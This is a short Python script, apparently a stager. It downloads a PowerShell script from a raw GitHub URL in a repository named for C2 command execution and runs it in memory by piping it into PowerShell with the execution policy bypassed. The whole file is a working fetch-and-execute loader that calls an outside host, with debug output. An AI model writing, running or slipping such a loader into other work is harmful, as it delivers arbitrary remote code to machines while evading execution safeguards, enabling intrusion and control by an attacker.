import requests
import subprocess
import sys

def execute_in_memory(url):
    print(f"[*] Connecting to GitHub: {url}")
    try:
        # Download PowerShell script
        response = requests.get(url, timeout=10)
        print(f"[DEBUG] HTTP status: {response.status_code}")
        if response.status_code != 200:
            print(f"[-] Failed to download script: HTTP {response.status_code}")
            return
        
        ps_script = response.text
        print(f"[+] Downloaded script ({len(ps_script)} bytes). Loading into memory...")
        print(f"[DEBUG] First 500 chars of script:\n{ps_script[:500]}...")

        # Launch PowerShell with stdin
        process = subprocess.Popen(
            ["powershell", "-ExecutionPolicy", "Bypass", "-Command", "-"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding='utf-8'
        )

        print("[*] Executing PowerShell script...")
        stdout, stderr = process.communicate(input=ps_script)

        if stdout:
            print("\n[OUTPUT FROM PS]:")
            print(stdout)
        if stderr:
            print("\n[ERROR FROM PS]:")
            print(stderr)
        
        print(f"[*] Process finished with exit code: {process.returncode}")

    except Exception as e:
        print(f"[-] Python error: {e}")

if __name__ == "__main__":
    # Update this URL to the raw link of your final ps.txt
    GITHUB_RAW_URL = "https://raw.githubusercontent.com/thedarkassasin/Agent_C2_command_exec/main/ps.txt"
    execute_in_memory(GITHUB_RAW_URL)